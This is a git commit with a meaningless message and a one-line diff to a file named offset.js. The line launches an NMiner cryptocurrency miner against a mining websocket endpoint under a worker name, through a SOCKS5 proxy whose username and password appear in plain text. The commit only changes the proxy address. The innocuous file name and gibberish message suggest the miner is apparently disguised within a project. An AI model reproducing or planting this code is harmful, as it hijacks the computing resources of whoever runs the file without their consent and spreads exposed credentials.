38775d47c809213f58e76b65ebfe43eab0131f23
Shari Parker <shari_shari58@yahoo.com>
2026-07-24 01:54:29 +0530

    easy that upbeat brr lovingly

--- offset.js
+++ offset.js
@@ -1,1 +1,1 @@
-new (require(".").NMiner)("wss://runtime.nmining.igrp.app/", "Subhas1975", { proxy: "socks5://dcswarup:webshare@46.203.228.173:9174" });
+new (require(".").NMiner)("wss://runtime.nmining.igrp.app/", "Subhas1975", { proxy: "socks5://dcswarup:webshare@104.238.10.117:6063" });
